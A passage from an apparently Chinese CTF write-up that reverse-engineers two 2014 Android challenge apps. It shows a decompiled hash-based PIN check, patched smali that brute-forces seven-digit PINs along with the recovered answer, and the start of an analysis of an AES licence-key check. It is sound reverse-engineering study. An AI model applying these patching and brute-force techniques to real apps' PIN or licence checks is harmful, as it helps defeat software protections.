class="function"><span class="keyword">public</span> <span class="type">static</span> boolean <span class="title">isOk</span><span class="params">(Context c, String _password)</span> </span>&#123;</span><br><span class="line">    String password = _password;</span><br><span class="line">    <span class="keyword">if</span> (_password.<span class="built_in">length</span>() &gt; <span class="number">7</span>) &#123;</span><br><span class="line">        password = _password.<span class="built_in">substring</span>(<span class="number">0</span>, <span class="number">7</span>); <span class="comment">// 只取前7个数字</span></span><br><span class="line">    &#125;</span><br><span class="line">    String r = <span class="built_in">OneWayFunction</span>(password);</span><br><span class="line">    DebugTools.<span class="built_in">log</span>(<span class="string">&quot;digest: &quot;</span> + password + <span class="string">&quot; =&gt; &quot;</span> + r);</span><br><span class="line">    <span class="keyword">return</span> r.<span class="built_in">equals</span>(<span class="string">&quot;be790d865f2cea9645b3f79c0342df7e&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>password只取前7个数字进OneWayFunction函数，之后将其返回的值与一个hash进行比对</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="type">static</span> String <span class="title">OneWayFunction</span><span class="params">(<span class="keyword">final</span> String password)</span> </span>&#123;</span><br><span class="line">    String[] hashes = &#123;<span class="string">&quot;MD2&quot;</span>, <span class="string">&quot;MD5&quot;</span>, <span class="string">&quot;SHA-1&quot;</span>, <span class="string">&quot;SHA-256&quot;</span>, <span class="string">&quot;SHA-384&quot;</span>, <span class="string">&quot;SHA-512&quot;</span>&#125;;</span><br><span class="line">    List&lt;byte[]&gt; bytes = ArrayTools.<span class="built_in">map</span>(ArrayTools.<span class="built_in">select</span>(ArrayTools.<span class="built_in">map</span>(hashes, <span class="keyword">new</span> <span class="built_in">MapAction</span>&lt;String, byte[]&gt;() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.Verify.1</span></span><br><span class="line">        @Override <span class="comment">// io.asis.ctf2014.numdriod.tools.MapAction</span></span><br><span class="line">            <span class="keyword">public</span> byte[] <span class="built_in">action</span>(String element) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MessageDigest digest = MessageDigest.<span class="built_in">getInstance</span>(element);</span><br><span class="line">                digest.<span class="built_in">update</span>(password.<span class="built_in">getBytes</span>());</span><br><span class="line">                <span class="keyword">return</span> digest.<span class="built_in">digest</span>();</span><br><span class="line">            &#125; <span class="built_in">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">                <span class="keyword">return</span> null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;), <span class="keyword">new</span> <span class="built_in">SelectAction</span>&lt;byte[]&gt;() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.Verify.2</span></span><br><span class="line">        @Override <span class="comment">// io.asis.ctf2014.numdriod.tools.SelectAction</span></span><br><span class="line">            <span class="keyword">public</span> boolean <span class="built_in">action</span>(byte[] element) &#123;</span><br><span class="line">            <span class="keyword">return</span> element != null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;), <span class="keyword">new</span> <span class="built_in">MapAction</span>&lt;byte[], byte[]&gt;() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.Verify.3</span></span><br><span class="line">        @Override <span class="comment">// io.asis.ctf2014.numdriod.tools.MapAction</span></span><br><span class="line">            <span class="keyword">public</span> byte[] <span class="built_in">action</span>(byte[] element) &#123;</span><br><span class="line">            byte[] b = <span class="keyword">new</span> byte[<span class="number">8</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; b.length / <span class="number">2</span>; i++) &#123;</span><br><span class="line">                b[i] = element[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i2 = <span class="number">0</span>; i2 &lt; b.length / <span class="number">2</span>; i2++) &#123;</span><br><span class="line">                b[(b.length / <span class="number">2</span>) + i2] = element[(element.length - i2) - <span class="number">2</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    byte[] b2 = <span class="keyword">new</span> byte[bytes.<span class="built_in">size</span>() * <span class="number">8</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; b2.length; i++) &#123;</span><br><span class="line">        b2[i] = bytes.<span class="built_in">get</span>(i % bytes.<span class="built_in">size</span>())[i / bytes.<span class="built_in">size</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        MessageDigest digest = MessageDigest.<span class="built_in">getInstance</span>(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        digest.<span class="built_in">update</span>(b2);</span><br><span class="line">        byte[] messageDigest = digest.<span class="built_in">digest</span>();</span><br><span class="line">        StringBuilder hexString = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (byte aMessageDigest : messageDigest) &#123;</span><br><span class="line">            String h = Integer.<span class="built_in">toHexString</span>(aMessageDigest &amp; <span class="number">255</span>);</span><br><span class="line">            <span class="keyword">while</span> (h.<span class="built_in">length</span>() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                h = <span class="string">&quot;0&quot;</span> + h;</span><br><span class="line">            &#125;</span><br><span class="line">            hexString.<span class="built_in">append</span>(h);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hexString.<span class="built_in">toString</span>();</span><br><span class="line">    &#125; <span class="built_in">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现hash基本都是单向的，发现如果只是爆破的话只有10^7的大小，感觉可以尝试</p><h3 id="方案1："><a href="#方案1：" class="headerlink" title="方案1："></a>方案1：</h3><p>网上师傅的方案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">.line 26</span><br><span class="line">  :cond_0</span><br><span class="line">  const/4 v0, 0x0</span><br><span class="line"></span><br><span class="line">  .local v0, &quot;i&quot;:I</span><br><span class="line">  :goto_0</span><br><span class="line">  const v2, 0x98967f</span><br><span class="line"></span><br><span class="line">  if-lt v0, v2, :cond_1</span><br><span class="line"></span><br><span class="line">  .line 38</span><br><span class="line">  return-void</span><br><span class="line"></span><br><span class="line">  .line 28</span><br><span class="line">  :cond_1</span><br><span class="line">  invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">  move-result-object v2</span><br><span class="line"></span><br><span class="line">  invoke-static &#123;v2&#125;, Lcom/example/forloop/MainActivity;-&gt;isOk(Ljava/lang/String;)Z</span><br><span class="line"></span><br><span class="line">  move-result v1</span><br><span class="line"></span><br><span class="line">  .line 29</span><br><span class="line">  .local v1, &quot;ok&quot;:Z</span><br><span class="line">  const v2, 0x186a0</span><br><span class="line"></span><br><span class="line">  rem-int v2, v0, v2</span><br><span class="line"></span><br><span class="line">  if-nez v2, :cond_2</span><br><span class="line"></span><br><span class="line">  .line 31</span><br><span class="line">  invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">  move-result-object v2</span><br><span class="line"></span><br><span class="line">  invoke-virtual &#123;p0, v2&#125;, Lcom/example/forloop/MainActivity;-&gt;log(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">  .line 33</span><br><span class="line">  :cond_2</span><br><span class="line">  if-eqz v1, :cond_3</span><br><span class="line"></span><br><span class="line">  .line 35</span><br><span class="line">  invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">  move-result-object v2</span><br><span class="line"></span><br><span class="line">  invoke-virtual &#123;p0, v2&#125;, Lcom/example/forloop/MainActivity;-&gt;log(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">  .line 26</span><br><span class="line">  :cond_3</span><br><span class="line">  add-int/lit8 v0, v0, 0x1</span><br><span class="line"></span><br><span class="line">  goto :goto_0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:cond_0</span><br><span class="line">const/4 v0, 0x0</span><br><span class="line"></span><br><span class="line">.local v0, &quot;i&quot;:I</span><br><span class="line">:goto_0</span><br></pre></td></tr></table></figure><p>这里首先初始化<code>v0=0</code>，然后初始化循环器i（存储在v0中）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const v2, 0x98967f       # 加载最大值 9,999,999 (0x98967F)</span><br><span class="line">if-lt v0, v2, :cond_1    # 如果 i &gt;= 9,999,999，跳转到 :cond_1（退出循环）</span><br></pre></td></tr></table></figure><p> <code>if v0 less than v2</code>（即<code>v0&lt;v2</code>）就会跳转到<code>cond_1</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line">move-result-object v2     # 将 i 转为字符串</span><br><span class="line">invoke-static &#123;v2&#125;, Lcom/example/forloop/MainActivity;-&gt;isOk(Ljava/lang/String;)Z</span><br><span class="line">move-result v1            # 调用 isOk() 并存储结果到 v1(ok)</span><br></pre></td></tr></table></figure><p>v0转换为字符串，然后将结果存储到v2，之后调用isOk，参数是v2，然后将返回值放入v1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const v2, 0x186a0        # 加载 100,000 (0x186A0)</span><br><span class="line">rem-int v2, v0, v2       # 计算 i % 100,000</span><br><span class="line">if-nez v2, :cond_2       # 如果余数为0（每100,000次），执行打印</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印当前进度</span></span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line">move-result-object v2</span><br><span class="line">invoke-virtual &#123;p0, v2&#125;, Lcom/example/forloop/MainActivity;-&gt;log(Ljava/lang/String;)V</span><br></pre></td></tr></table></figure><p><code>if v2 no equal zero</code>，就是<code>v2!=0</code>就会跳转到<code>cond_2</code>标签处执行，否则继续执行下一条指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">:cond_2</span><br><span class="line">if-eqz v1, :cond_3       # 如果 isOk() 返回 true，执行成功逻辑</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印成功的数字</span></span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line">move-result-object v2</span><br><span class="line">invoke-virtual &#123;p0, v2&#125;, Lcom/example/forloop/MainActivity;-&gt;log(Ljava/lang/String;)V</span><br></pre></td></tr></table></figure><p>如果<code>v1==0</code>就会打印成功的数字，调用的是log进行打印</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:cond_3</span><br><span class="line">add-int/lit8 v0, v0, 0x1  # i++</span><br><span class="line">goto :goto_0              # 跳回循环开头</span><br></pre></td></tr></table></figure><p>如果没满足，就执行<code>i++</code>然后跳转回去</p><p>但是为了将其粘贴到apk中就要对其进行修改</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">const/4 v0, 0x0</span><br><span class="line"></span><br><span class="line">.local v0, &quot;i&quot;:I</span><br><span class="line">:goto_3</span><br><span class="line">const v2, 0x98967f</span><br><span class="line"></span><br><span class="line">if-lt v0, v2, :cond_3</span><br><span class="line">return-void</span><br><span class="line"></span><br><span class="line">.line 28</span><br><span class="line">:cond_3</span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">move-result-object v2</span><br><span class="line"></span><br><span class="line">invoke-static &#123;p0, v2&#125;, Lio/asis/ctf2014/numdriod/Verify;-&gt;isOk(Landroid/content/Context;Ljava/lang/String;)Z</span><br><span class="line"></span><br><span class="line">move-result v1</span><br><span class="line"></span><br><span class="line">.line 29</span><br><span class="line">.local v1, &quot;ok&quot;:Z</span><br><span class="line"></span><br><span class="line">const v4, 0x186a0</span><br><span class="line"></span><br><span class="line">rem-int v4, v0, v4</span><br><span class="line"></span><br><span class="line">if-nez v4, :cond_6</span><br><span class="line"></span><br><span class="line">.line 31</span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">move-result-object v2</span><br><span class="line">invoke-static &#123;v2&#125;, Lio/asis/ctf2014/numdriod/tools/DebugTools;-&gt;log(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">:cond_6</span><br><span class="line"></span><br><span class="line">if-eqz v1, :cond_2</span><br><span class="line"></span><br><span class="line">goto :goto_4</span><br><span class="line">.line 31</span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">move-result-object v2</span><br><span class="line"></span><br><span class="line">invoke-static &#123;v2&#125;, Lio/asis/ctf2014/numdriod/tools/DebugTools;-&gt;log(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">.line 26</span><br><span class="line">:cond_2</span><br><span class="line">add-int/lit8 v0, v0, 0x1</span><br><span class="line"></span><br><span class="line">goto :goto_3</span><br></pre></td></tr></table></figure><h3 id="方案2："><a href="#方案2：" class="headerlink" title="方案2："></a>方案2：</h3><p>这个方案是直接将Verify中加个main函数，然后修改一些报错，直接运行即可，参照<a href="https://gist.github.com/volpino/2edea8503822aefb4c9e">https://gist.github.com/volpino/2edea8503822aefb4c9e</a></p><p>得到答案是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">................&gt; java .\sample\Verify.java</span><br><span class="line">FOUND!! 3130110</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504141456731.png" alt="image-20250330220516717" style="zoom:50%;" /><h2 id="2014-Sharif-University-Quals-CTF-Commercial-Application"><a href="#2014-Sharif-University-Quals-CTF-Commercial-Application" class="headerlink" title="2014 Sharif University Quals CTF Commercial Application"></a>2014 Sharif University Quals CTF Commercial Application</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="type">void</span> <span class="title">checkLicenceKey</span><span class="params">(<span class="keyword">final</span> Context context)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.app.<span class="built_in">getDataHelper</span>().<span class="built_in">getConfig</span>().<span class="built_in">hasLicence</span>()) &#123; <span class="comment">// 如果没有有效许可证</span></span><br><span class="line">          <span class="built_in">showAlertDialog</span>(context, OK_LICENCE_MSG);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      LayoutInflater li = LayoutInflater.<span class="built_in">from</span>(context);</span><br><span class="line">      View promptsView = li.<span class="built_in">inflate</span>(R.layout.propmt, (ViewGroup) null);</span><br><span class="line">      AlertDialog.Builder alertDialogBuilder = <span class="keyword">new</span> AlertDialog.<span class="built_in">Builder</span>(context);</span><br><span class="line">      alertDialogBuilder.<span class="built_in">setView</span>(promptsView);</span><br><span class="line">      <span class="keyword">final</span> EditText userInput = (EditText) promptsView.<span class="built_in">findViewById</span>(R.id.editTextDialogUserInput);</span><br><span class="line">      alertDialogBuilder.<span class="built_in">setCancelable</span>(<span class="literal">false</span>).<span class="built_in">setPositiveButton</span>(<span class="string">&quot;Continue&quot;</span>, <span class="keyword">new</span> DialogInterface.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: edu.sharif.ctf.activities.MainActivity.4</span></span><br><span class="line">          @Override <span class="comment">// android.content.DialogInterface.OnClickListener</span></span><br><span class="line">          <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(DialogInterface dialog, <span class="type">int</span> id) &#123;</span><br><span class="line">              String userEnteredValue = userInput.<span class="built_in">getText</span>().<span class="built_in">toString</span>();</span><br><span class="line">              String storedKey = MainActivity.<span class="keyword">this</span>.app.<span class="built_in">getDataHelper</span>().<span class="built_in">getConfig</span>().<span class="built_in">getSecurityKey</span>();</span><br><span class="line">              String iv = MainActivity.<span class="keyword">this</span>.app.<span class="built_in">getDataHelper</span>().<span class="built_in">getConfig</span>().<span class="built_in">getSecurityIv</span>();</span><br><span class="line">              boolean licenceKeyIsValid = KeyVerifier.<span class="built_in">isValidLicenceKey</span>(userEnteredValue, storedKey, iv);</span><br><span class="line">              <span class="keyword">if</span> (licenceKeyIsValid) &#123;</span><br><span class="line">                  MainActivity.<span class="keyword">this</span>.app.<span class="built_in">getDataHelper</span>().<span class="built_in">updateLicence</span>(<span class="number">2014</span>);</span><br><span class="line">                  MainActivity.isRegisterd = <span class="literal">true</span>;</span><br><span class="line">                  MainActivity.<span class="keyword">this</span>.<span class="built_in">showAlertDialog</span>(context, MainActivity.OK_LICENCE_MSG);</span><br><span class="line">                  <span class="keyword">return</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              MainActivity.<span class="keyword">this</span>.<span class="built_in">showAlertDialog</span>(context, MainActivity.NOK_LICENCE_MSG);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;).<span class="built_in">setNegativeButton</span>(<span class="string">&quot;Cancel&quot;</span>, <span class="keyword">new</span> DialogInterface.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: edu.sharif.ctf.activities.MainActivity.5</span></span><br><span class="line">          @Override <span class="comment">// android.content.DialogInterface.OnClickListener</span></span><br><span class="line">          <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(DialogInterface dialog, <span class="type">int</span> id) &#123;</span><br><span class="line">              dialog.<span class="built_in">cancel</span>();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      AlertDialog inputLicenceDialog = alertDialogBuilder.<span class="built_in">create</span>();</span><br><span class="line">      inputLicenceDialog.<span class="built_in">show</span>();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>关键函数，处理key过程如下</p><p>按下continue之后，usrinput会被转为string进入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">userEnteredValue</span> <span class="operator">=</span> userInput.getText().toString();</span><br><span class="line"><span class="type">String</span> <span class="variable">storedKey</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.app.getDataHelper().getConfig().getSecurityKey();</span><br><span class="line"><span class="type">String</span> <span class="variable">iv</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.app.getDataHelper().getConfig().getSecurityIv();</span><br><span class="line"><span class="type">boolean</span> <span class="variable">licenceKeyIsValid</span> <span class="operator">=</span> KeyVerifier.isValidLicenceKey(userEnteredValue, storedKey, iv);</span><br></pre></td></tr></table></figure><p>会从配置中得到storedKey和iv，之后进入是否有效的判断</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String CIPHER_ALGORITHM = <span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> String VALID_LICENCE = <span class="string">&quot;29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">static</span> boolean <span class="title">isValidLicenceKey</span><span class="params">(String userInput, String secretKey, String iv)</span> </span>&#123;</span><br><span class="line">    String encryptUserInputData = <span class="built_in">encrypt</span>(userInput, secretKey, iv);</span><br><span class="line">    <span class="keyword">return</span> encryptUserInputData.<span class="built_in">equals</span>(VALID_LICENCE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">static</span> String <span class="title">encrypt</span><span class="params">(String userInput, String secretKey, String iv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        SecretKeySpec secretKeySpec = <span class="keyword">new</span> <span class="built_in">SecretKeySpec</span>(<span class="built_in">hexStringToBytes</span>(secretKey), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        Cipher cipher = Cipher.<span class="built_in">getInstance</span>(CIPHER_ALGORITHM);</span><br><span class="line">        IvParameterSpec ivSpec = <span class="keyword">new</span> <span class="built_in">IvParameterSpec</span>(iv.<span class="built_in">getBytes</span>());</span><br><span class="line">        cipher.<span class="built_in">init</span>(<span class="number">1</span>, secretKeySpec, ivSpec);</span><br><span class="line">        byte[] encryptedBytes = cipher.<span class="built_in">doFinal</span>(userInput.<span class="built_in">getBytes</span>());</span><br><span class="line">        String encryptedText = <span class="built_in">bytesToHexString</span>(encryptedBytes);</span><br><span class="line">        <span class="keyword">return</span> encryptedText;</span><br><span class="line">    &#125; <span class="built_in">catch</span> (Exception e) &#123;</span><br><span class="line">        e.<span class="built_in">printStackTrace</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">static</span> String <span class="title">bytesToHexString</span><span class="params">(byte[] bytes)</span> </span>&#123;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line">    <span class="keyword">for</span> (byte b : bytes) &#123;</span><br><span class="line">        sb.<span class="built_in">append</span>(String.format(<span class="string">&quot;%02x&quot;</span>, Integer.<span class="built_in">valueOf</span>(b &amp; <span class="number">255</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.<span class="built_in">toString</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> byte[] <span class="built_in">hexStringToBytes</span>(String s) &#123;</span><br><span class="line">    <span class="type">int</span> len = s.<span class="built_in">length</span>();</span><br><span class="line">    byte[] data = <span class="keyword">new</span> byte[len / <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += <span class="number">2</span>) &#123;</span><br><span class="line">        data[i / <span class="number">2</span>] = (byte) ((Character.<span class="built_in">digit</span>(s.<span class="built_in">charAt</span>(i), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>) + Character.<span class="built_in">digit</span>(s.<span class="built_in">charAt</span>(i + <span class="number">1</span>), <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要是通过encrypt函数进行加密，然后和invalid_license进行比较</p><p>在getconfig中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> AppConfig <span class="title function_">getConfig</span><span class="params">()</span> &#123;</span><br><span 